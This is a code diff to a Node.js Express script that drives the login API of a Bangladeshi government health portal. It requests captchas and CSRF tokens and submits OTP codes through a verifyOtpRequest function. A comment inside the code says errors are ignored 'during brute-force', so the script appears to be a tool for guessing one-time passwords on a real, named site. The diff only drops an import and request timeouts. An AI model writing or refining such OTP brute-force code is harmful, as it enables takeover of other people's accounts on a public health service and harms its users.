@@ -1,7 +1,6 @@
 const express = require('express');
-const fetch = require('node-fetch');
-
 const app = express();
+
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
@@ -21,7 +20,6 @@ function generateSessionId() {
     });
 }
 
-// ক্যাপচা লোড করা (সরাসরি)
 async function getLoginCaptcha() {
     sessionData.sessionId = generateSessionId();
     let url = "https://amarswasthyo.mohfw.gov.bd/api/requests/login-captcha";
@@ -36,8 +34,7 @@ async function getLoginCaptcha() {
         let res = await fetch(url, {
             method: 'POST',
             headers: headers,
-            body: JSON.stringify({ sessionId: sessionData.sessionId }),
-            timeout: 7000
+            body: JSON.stringify({ sessionId: sessionData.sessionId })
         });
         let data = await res.json();
         if (data.imageUrl) {
@@ -82,8 +79,7 @@ app.post('/', async (req, res) => {
             let response = await fetch(url, {
                 method: 'POST',
                 headers: headers,
-                body: JSON.stringify(payload),
-                timeout: 7000
+                body: JSON.stringify(payload)
             });
             let resData = await response.json();
             if (resData.success === true) {
@@ -111,8 +107,7 @@ app.post('/', async (req, res) => {
 async function verifyOtpRequest(otp) {
     try {
         let csrfRes = await fetch("https://amarswasthyo.mohfw.gov.bd/api/auth/csrf", {
-            headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/151" },
-            timeout: 5000
+            headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/151" }
         });
         let csrfData = await csrfRes.json();
         let csrfToken = csrfData.csrfToken;
@@ -143,8 +138,7 @@ async function verifyOtpRequest(otp) {
         let callbackRes = await fetch("https://amarswasthyo.mohfw.gov.bd/api/auth/callback/credentials", {
             method: 'POST',
             headers: headers,
-            body: postData,
-            timeout: 5000
+            body: postData
         });
         let cbData = await callbackRes.json();
 
@@ -153,7 +147,7 @@ async function verifyOtpRequest(otp) {
             return true;
         }
     } catch (e) {
-        // Ignore timeout or network errors during brute-force
+        // Ignore network errors during brute-force
     }
     return false;
 }
